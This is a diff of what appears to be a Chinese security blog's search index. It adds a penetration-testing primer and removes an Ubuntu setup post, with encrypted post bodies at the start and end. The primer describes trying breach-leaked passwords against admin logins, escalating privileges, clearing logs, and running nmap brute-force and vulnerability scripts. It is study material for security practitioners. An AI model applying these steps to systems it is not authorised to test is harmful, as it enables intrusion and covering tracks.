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 </div>]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
   </entry>
   <entry>
     <title>蓝队基础</title>
@@ -659,23 +471,184 @@
       </tags>
   </entry>
   <entry>
-    <title>Ubuntu (20.04)虚拟机安装配置</title>
-    <url>/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
-<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
-<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
-<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
-<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
-<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
-<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+    <title>渗透测试基础</title>
+    <url>/2021/03/04/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h2 id="渗透思路-流程"><a class="header-anchor" href="#渗透思路-流程"></a>渗透思路/流程</h2>
+<p><strong>信息收集</strong></p>
+<p>a、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</p>
+<p>b、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</p>
+<p>c、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</p>
+<p>d、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
+<p>e、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
+<p>f、google hack 进一步探测网站的信息，后台，敏感文件</p>
+<p><strong>漏洞扫描</strong></p>
+<p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等</p>
+<p><strong>漏洞利用</strong></p>
+<p>利用以上的方式拿到webshell，或者其他权限</p>
+<p><strong>权限提升</strong></p>
+<p>提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权</p>
+<p><strong>日志清理</strong></p>
+<p>总结报告及修复方案</p>
+<h2 id="资产搜集"><a class="header-anchor" href="#资产搜集"></a>资产搜集</h2>
+<h3 id="子域名搜集"><a class="header-anchor" href="#子域名搜集"></a>子域名搜集</h3>
+<ul>
+<li>工具1：Layer子域名挖掘机5.0
+<ul>
+<li>支持服务接口、暴力搜索、同服挖掘三种模式</li>
+<li>支持打开网站、复制域名、复制IP、复制CDN</li>
+<li>支持导出检测结果等功能</li>
+</ul>
+</li>
+<li>工具2：SubdomainsBurte
+<ul>
+<li><a href="https://github.com/y1ng1996/lijiejie_subDomainsBrute">https://github.com/y1ng1996/lijiejie_subDomainsBrute</a></li>
+<li>暴力枚举，速度快</li>
+</ul>
+</li>
+<li>网站：SSL证书查询\网络空间搜索引擎
+<ul>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://crt.sh">crt.sh</a></li>
+<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过CDN找真实IP"><a class="header-anchor" href="#绕过CDN找真实IP"></a>绕过CDN找真实IP</h3>
+<ul>
+<li>网络空间搜索引擎
+<ul>
+<li><a href="https://www.zoomeye.org/">钟馗之眼</a></li>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+<li><a href="https://censys.io">censys</a></li>
+<li><a href="https://www.shodan.io/">shodan</a></li>
+<li><a href="https://www.dnsdb.io/zh-cn">全球DNS搜索引擎</a></li>
+<li><a href="https://fofa.so/">fofa</a></li>
+<li><a href="http://lookahead.surfwax.com/">Surfwax元搜索</a></li>
+<li><a href="https://archive.org/web/">Way Back Machine</a></li>
+</ul>
+</li>
+<li>让目标主动连接我们
+<ul>
+<li>RSS订阅</li>
+<li>邮件服务器</li>
+</ul>
+</li>
+</ul>
+<h3 id="IP段整理"><a class="header-anchor" href="#IP段整理"></a>IP段整理</h3>
+<ul>
+<li>通过<a href="http://ipwhois.cnnic.net.cn/">中国互联网络信息中心</a>查询</li>
+<li>纯真IP数据库</li>
+</ul>
+<h3 id="C段查询、旁站查询"><a class="header-anchor" href="#C段查询、旁站查询"></a>C段查询、旁站查询</h3>
+<ul>
+<li><a href="https://www.webscan.cc/">webscan</a></li>
+</ul>
+<h2 id="端口扫描及利用"><a class="header-anchor" href="#端口扫描及利用"></a>端口扫描及利用</h2>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>对应服务</th>
+<th>端口号</th>
+<th>对应服务</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>2601 2604</td>
+<td>zebra路由</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet</td>
+<td>3312</td>
+<td>kangle主机管理系统</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>3389</td>
+<td>远程桌面</td>
+</tr>
+<tr>
+<td>80-89</td>
+<td>web</td>
+<td>4440</td>
+<td>rundeck</td>
+</tr>
+<tr>
+<td>161</td>
+<td>snmp</td>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>389</td>
+<td>LDAP</td>
+<td>5900</td>
+<td>vnc</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https（心脏滴血）</td>
+<td>6379</td>
+<td>redis未授权</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB（永恒之蓝）</td>
+<td>7001 7002</td>
+<td>WebLogic默认弱口令，反序列</td>
+</tr>
+<tr>
+<td>512 513 514</td>
+<td>Rexec</td>
+<td>8080</td>
+<td>tomcat</td>
+</tr>
+<tr>
+<td>873</td>
+<td>Rsync未授权</td>
+<td>8080 8089 9090</td>
+<td>JBOSS</td>
+</tr>
+<tr>
+<td>1025</td>
+<td>NFS</td>
+<td>8161</td>
+<td>activemq未授权访问</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+<td>27017 27018</td>
+<td>Mongodb未授权访问</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+<td>50000</td>
+<td>SAP命令执行</td>
+</tr>
+</tbody>
+</table>
+<p><strong>利用 nmap+脚本快速捡洞和检洞</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">系统漏洞检测：nmap --script smb-check-vulns.nse -p 192.168.1.1</span><br><span class="line">数据库密码检测：nmap --script=brute 192.168.1.1</span><br><span class="line">收集应用服务信息：nmap -sC 192.168.1.1</span><br><span class="line">检测常见漏洞：nmap --script=vuln 192.168.1.1</span><br><span class="line">检测部分应用的弱口令：nmap --script=auth 192.168.1.1</span><br></pre></td></tr></table></figure>
+<h2 id="指纹搜集"><a class="header-anchor" href="#指纹搜集"></a>指纹搜集</h2>
 ]]></content>
       <categories>
-        <category>环境配置</category>
+        <category>渗透</category>
       </categories>
-      <tags>
-        <tag>linux</tag>
-        <tag>环境配置</tag>
-      </tags>
   </entry>
   <entry>
     <title>At the very beginning...</title>
@@ -695,6 +668,33 @@
       <categories>
         <category>杂记</category>
       </categories>
+  </entry>
+  <entry>
+    <title>dark web</title>
+    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1/Bs9i/o01pEor2rzLSi1yz6GkgkKWYRa9sgwbdm4LZ+UqiciYSrPQVTSmyfqDoEsVLkSqAg8R/sVw9IgMi5Onhly1/RJpD30hH6RT5uQWiBTzGScE625p/e7ZOQbfo6UX87G3HKa26RMZA5ZkZMTC/64WDd3yM7uT3tmGxr/QsJmI+wiaY4IUUpBYPfwuHOHGlzezm+C08FHBmP74XpuQks7Pse53QNl6oqOlS6H+a5XrkkYFgQr2zo2LQwFDv99jJsRjHrHLUxJbum4cN3mwJhh+GvLPUs7wPpSnCoLvgzlTiHu7wc43+gA/KEm56fI65ko2a+veuvbc0/An3u7OW12eq0ATnJEtmgucWXdF7a/NzZ64cX2B8pQaQowsvJyYXPwxELkfiqelfDzUva8U5kMW0wYmidIyAX3eGnG1Gz61YWe10PGT6PmmB66P60CkAiUXWjRlBTgJe79QwGtW4MmTO8IL6gysk11Jx3nger9l6HyACbiVntNIXxsca1gF6mAZ8WGti3HCzGgojfy5ZocBrNNOhQXpQjYAbtUzNdP7kRHd6ZurTmRHBG2DKRhdrRzs58SeTfL1G30F95Q8hCI+IcGdWsNmPGNUtCUXR8yDHCNlNeslNKfvKw1uoUTB2jGySfAHAhYHSP2VcpNQC1YJPP6wwVQ5o9qvs5cd2wxMxQhlGZJdKB4IchH3HhAU+NTKV24nJyrHhSF4GnvuEUrQ9nU7Kd5dWsXLBS7OU9Sx79KU26OV5XeOT+AXnuPTLmkpimAO857oKk1Nur4FhR5z5h5HaDnaX0NIb88fywbDL8OomhtM/hGvsjU1xilyXoSluVytuOZkY1pkiK/dVrqfzaG43fmC6HkgKDwXhn5nzn9X9jmBa2om+vV7aphdYPV/0sbLkMrG5mGb4RwywAw8n+rn5Q9GVkwE5LohTE2PMo1nvCiTW0NWYnZkgwsTnslVz/HrpgDpnmhB3F+Muqs/D5pw29KFSfXSh47NOe6C3zO+i+fQwL2INHlJOu+zzaN84mSG1n/4jUSYmQ5EL8Wv3zyT1uQ/qvtMvU2UAP3n8JUUhVuf6GrieIKT5YIC99GW9haW+VQT7kokv5eqT5HZcwaZ5f6I/LMwmx1dWmXIZWkfzZoHCX1FXJAdl1JxqhDyZnXWLvlUVsrN6bq+QzS/E2HGqkM/vdy95nwwnhJuzy0Tvi+YAWeX26vQe1khYxQoSUCXdm8ssrS33R2cUIWdlwUR8XanhhD5Vi4reIgmRLwNzdeLACwd9KN2BdV4rJB6nJ9FWvsUAYBFiBwIAkgaZuiz4oMyMQ9otSe4M5DN+wMWRN+/I801SEuy5bGlXFMDy0YKD94aiSeaNAjWc9iB3WzH2ZAzK8pff5I4dZ9KhEelkHl3/pbN/iOqfVZTjDdJQWSs05CZh+E0AlbSusWW0K7gkLuC3CClB+ikAD3HWQyZllStskBlD3tpynoAF1oeu4H5coFzmifGWnIQRmVd+Qc8LdxmskQYgBAtypLSF5yE/JTs1pi8QpylaAPYxQbfaRSi2M9F0Q+YGmjtSl2H8uqx56pq18HmmFiL6gCRdNG7Q+XTyDdUCso+tDQaZHZ4KtCkC/6h6LdIJgS/9HB6mMICRjG3YIdV6UZ62p3VeWMuo2G1Vx/BuA36NeM3oRD4aJqgEsEdRMDVVRIAqhnIDqvF728S8FqZoyzftNTyIlNF2paHLYTcauPUEyLDaxEGhG56Uk76sS60UFZNJsiMyyww0ET0WFlqPSOY1QFRl+gLWKAPNmmcC8XxMOVoEE9B9nFTkR1alBMhkl/ez04Qv0mDTg7X3lq70YplqrpTze6+ebZnWoz+PQAx2soY0bAmOEdFSlu2kBPqxCFOJfTaoxNyBmCXqAgoTscUfmbK1Idds60LHxrZN9uaY9S/qFbGu+3o2BcYvMHtg7Mm41KGX235cFS4SPPVeXKGY15J54wBYLr/9y7elrgWhZOQheVW+sQX3iavTFOD//oSLLSeMLH58E7pgS4dIZ2te2QBAL7II8TVLTANjPPmFvKqTy2nrnLnxDlNYx2jbQcl1qS8Bh/WPKUg1RlyT6DO7vi04OF6zHKHsmW7WjUULpT9+E0Bj/Ihq9g9jyXfsxSlaqapJQGhNhxBZA0hzXx8rC+6c/hWY+0+kDs5OWTU4fiyn6OEm454KlFSFyxWQW5lVCrJ5IE80QgnFT2e+l/BSqTZQgJKVejyaqlidBe8I1ZJn42eCO5mzQYe6lo3md+dbb8A1tX0DHrXC+uPH66BIFV6V+faGQqFK38bZ1ujbZXuxetDl4L0bsRTbbmIWvmY93tPdyGDaLp8eBFC+s+dA32N//37bjrFqYV10SqQI6KvHZQcFeOY7N1MHGdZkGCAENlnHkFSVbNOXU67FaoUS693egg9CghucV6dxGIzEfr7ByLhYhU2NJvx3/w8Ul8db99gCO/0ux5W49yQtHg3ZuRYCDC/GXZqQDbOq9QDD/aXXPiLm8/opSErUk5eNcOXqPPpcdf5JmKBP8XEREFF6Q058qDsETURIPZZLhBOHavmh7auFV0NgXWVB6ev1t/fi5y+evume7toCPA7oU7/QRHkJ2vai0ayeF/tEiNcy4RsWGg6Ons/9AYvGSE6lfeQYeWqoCdfLf6d0dl1h9cQD9vVZcl/0WnGAQHH3cadkmyyKw/q3DwupR5DGt9RocO1sxHRQnydcS1v7Ci6cR0cJrU/iGSSgNeLuNfDqf2ptPqG33f/DK46HdWrq9hvtpsaS8EolAPKf5UQ1ay2vcOAvH7kRJ/zbVzFENZNT6egs1FSFPBFumGbdHbjeUUWOFo21Hrh2m0pFz+bO9ZdUNNSgXv5B0mpfePNDlikwVqejFIDcF09C+F9jNnsJzP4Feny6ZEINtRpzbUmXdMvdaiVMezZ7qCaMMussfgFO1Pv0OiqNj2x8HimVxOJKd8YF9Wj3GzhhJ8AxSxd6qEPgwpTzNFeNuQC1OxRQ5ywgM9yb68V0aSP4tlm81lhP9uA3HdebNvPV36I7U8UcpsUF+XGQWSDZGEzBwnwAs+f4l8pOp92ti9JQmknmclkVONa1SdbJl5K10W+IKKT51d8fFKz/xXihe/0pRmlvcZXCrOXogEgMd/NW1u334Lg8dFNwYbgIn4EpzDq30IBXDkaEKgOVcf+QYuDc2eguWjQV67JYQEUPDUrYLk4iBcF3uoDyDV3E4KvrfDmhtOc65Otv9uEZ2s9+KrqQY+N/+vLQdfSm5Z1NBGNh/IqJtMQazKhJrp7HXEDom67tEkqx8GxINsBDAYXbhbCdU3NL8802sVZkqi8q6QItyj1R0SWDoROkjvuxN2tXJOwL3oErRvrSJx8JdQFVwCjqwus2VoN2NS+4DudSoFYxaWU8jBJ6LFf1bAlDhOkeJ1bxKtqBHQ44LyiUKyYl+LEsT9SDDq7d+vcMxz0b8LvJtpAjxKo3gdPHk9xkwjsBM4uCKsxF1WXhGhXLo4G/7J8USx+r4Zth1+BRQYHGeSSwGKHPq8ETYfY3N1dYj3Dta3OpUhuqwYBwplGfnzube1TwHXIBNKQg/otw269fkeMoc50o/XALhpoeEKc+mbbrERR2HRCqElFjcivUM8yhm6BDBY0ICygH5eQKfjh0B1gCXrwK1Js0FzIm/alR/Th+KOWfN7eNv8S9/WZudLcjOjMHZT2fXlQF2dqyaTyrjE+c3k5l4QScQmA9lbRROgOP6/1DoRRFEJAdFYmbVwh/a3ud7S0DvA8ZyUqxng41a4LiINKUrWbh+qC+MeuhrNQaOjxDdPDvQeyYAkFA5v47QfrX+rmsWEitYTSlHw0W89xJhdIFMN/KEcDPYN5XXW2I0uuGKv6o1HFT2+ybDXirdwgy8DCgJ7ew1wt4/jUJMsuvrUj58oro/KCyo0T5a/3GMe3FKjea1B6D1gQJgJY0DsOFZtYo2vRUsUVhB3cVNvGPoNhUMLokgS9WJZYbP4hG4k7ib3o4G1qg3UiYiEpdTl7KxXurr7FI9p3RNbLe+XOIbUzYJS5uccnQNKgLppDZZCKp9c04jZXca1FWWx8xoQ4gPWUM8WDlFID6kz1g3OoYqmDYv53OswmnF8zG1zViFGp/+/oAdEnZtioH/HP9Z3uYTFcp70E9STljXvtkFC8YxUwLIW0YcygA/VtqXjPBEH/1XVhQZzJhhW8aPXNWcx5+WG9QivDitnaZL4JawoplfD8eKzSgumwBiLhcE9c+wVBAEGpY10bfcjw9fZw5bIToUmrpU5YyUDuHEZ+zY3NVQ7mIGJy7MYPWjgpMDDNeNyzHG20jro6LJSWtOM+Jq2txjFRSEWdD4t3ReoZEiyKOx117a/Zqg7z4m0Hi6rGwegE7Xn5mdNm4EdP+eGf0AEahlqiXa0751BtHPpCQLlIUqtlFBuxSjYXZvIACCvBxFqpA9EL5ChiXtgrORrIoZzZrisYlurYp0Vhqp0NjDQfm/rhRhrNwnRkL+t8OHy66LCe94GuUX8VscVPyTYq2xdW1Eja49IPa3M6/cv6yt74hq1hhJPeWVuTYIW2c2XSs1WCy8vcGIzrysIfv7OtBMrpMWb12LbLVr5MTsP+vBxb1Z5B8cGZlnA/X3B4tefOz/t0RpKrGxmMfTlVGjV1tgA1kq70mpzdSyjD1/z1fvP8CCVQL3g+ahHRm2pIz3GodbNWUT5S0kNzFSk+RFbo++5N7brrdkIQRfoUV2MtKZMc/bNHZ7sLOlbJJnH2q/SOuzQZZGAQJSH6K6mhD6Pq3vWf3NX3sHG/Z/FKgN9F0DEb57lMHJwcZ1649OdbnMFIh4YWBJU/K0A5OABRlEQNz1OqLU08aq/OlLhFhTSzHzM+9eHSUuT32pbPi70weLfNnvP3NaWNZNlv2we3fjfHwqcVWqzMn+V3rwj/y3iJ4eg5bo9DrndbBLcmS1CGZCAgruhWguvMvu6QVy9lrkwdv33KUoZd3BGM7TYZBLyf/njgtxFxzFmC9M03PGOigW/842jP7USZGWfpIWwUoqn0tUo4SOY+drFVQEmyi/M70UCZK/u2t7S8dm9+tEZNpuEcZFJ7QJ959ZaqOlJWenZGSBqCdAAQ+ivmMrVBxfRgIIOfP3QVWWM6oAHa6ljf7q9IBPnetZ/7HeWUHpQ3cAwSwPRmOzgjTW4E3aOKMXy/XHYnleBq/PHuc8zYnKCYZ61oDtNJNZ7GXIJv2pD295S/F6kC3TELtNwPZljQHAa99l4w1SjNfSi25vIjHKwuSk9vpOtZb+hMgWAksFazYReIDZYc3nMD/s7GqJOvtlrLu8ogP4nHCl8ybDkkiALLTuP9BIo9CWo7P+qwN/QN5fadrcFX3oKxACHvzpPYLoNTc7soGEY/7nGjCyrDVYHD5q3CsfIUczqZ+RxNZr2e0SU9Rxx8+6PQXT9FYyHD7PBhxwHy0iHiVEtkJsWoV+qSwYg8MktIjanzZAt0LAdWI3wlL141uicSonItiiCahL9Gg6QPQhzLp8qQNXSBVJKkqxsPWFUrZXPCs6IvmpR718EgMjvzQV6ACz+5/Mdkon8l8bQzXj+LEv1lQovfCnIsS6z8oFo3a6Eo/9nGqrj4HuVflK/yrI/TwfuAsxdOIS2hnYRQlaHOo0hilQ/+xoVtodiC4aPun8siWM8A8zRxY5cdV/z4JU8u9uSnT8eHrqcmJQ7WiiZo6E4g7ope6lsUu4JtSL8zh8sVW82wLBslHJ7h+vCZJNTWLspdbMW9pAWkALAvrWeoib4geHtRFao1T+2Ahb0PF0Gyg3lmN3K2Ov6Wj6xQUV26U+/mbWwBmHGROHPS6Y9s8cQEpnS/QXoPnra7s7vEyXmV/f/8ndYgf4G6Acxpw/y2fpLRRCM5db0b5lay82dhOM2iaO/e8R6jDbRC9NvX590c2WXPmmXVBVuquM6hH5k79vrCBP4/1WFrtDqLsqycJNZEGuBXeQxRBdH8sM9LbQ9IVa/DF9hcOQbIWTkb4oybctIIG1gZsz3FWMewVu4FXXsjnG6bLnW9OHAO89r7ypw1lrFqbtUHVY8tC1HIRNNzh5kHXvJZ++AOaNsi6UvStZ8Np9NNQquR0W0MwcnGs338DEOPkykwuARdrMMcooIh9rZc/QKnn3kxt7fPOHqtkT8Ouazic6hKi4PLZEbBXt6kOZswEfAU5RdIOKZ3LnDAzCoyj+goEdfm/Nt08J4KRiNb6L1G6jjEJYZWA8RqSm8+LF1qH9P8o6+Whmn/SwKP2CyVIKP8aTcT7gH5EofZi1e7KLIwwFBYPxRsw+osQmTPQJdE6RX0TZLDH4Iyr8cQLzvRz0CA+tSr+ZL6xFBrWAnDdVP5ZjPh5xU37/MygXL46AEoe7x4SzawUfJzuxztKjNGBNasTpnVFUXCINjy3pAmH34dbH6zDJunMMF+lAb8fofDi5UDK+7C4CNbiAKjs2vADMv6/BMWtdg9o4fD4CxrYk5HulCtA4tT4XBfPEuo+8tHOAZ+sD6T/1ey5wdusg69TouuelhSWY547mTZMK61sFvv8l0UT+BWhNJwjPzHr/el2nT8jBwiQQqDspQu2UuV+280nNCMu67hkRT2BQDKO2n/GIQlgvNJFaTKWFMAFAeSDN1wXgat4jMDkZ71DFpDcENRo